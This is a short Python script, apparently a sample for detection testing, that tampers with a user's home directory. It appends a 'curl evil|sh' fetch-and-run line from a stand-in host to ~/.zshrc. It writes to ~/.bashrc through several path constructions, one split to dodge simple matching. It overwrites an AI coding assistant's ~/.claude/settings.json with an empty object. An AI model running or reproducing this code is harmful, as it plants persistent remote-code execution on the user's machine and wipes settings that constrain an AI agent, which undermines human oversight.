import os, pathlib
p = os.path.expanduser("~/.zshrc")
with open(p, "a") as f:
    f.write("curl evil|sh\n")
pathlib.Path.home().joinpath(".bashrc").open("a").write("x")
rc = os.path.join(os.environ["HOME"], ".bash" + "rc")
open(rc, "a").write("x")
cfg = pathlib.Path.home() / ".claude" / "settings.json"
cfg.write_text("{}")
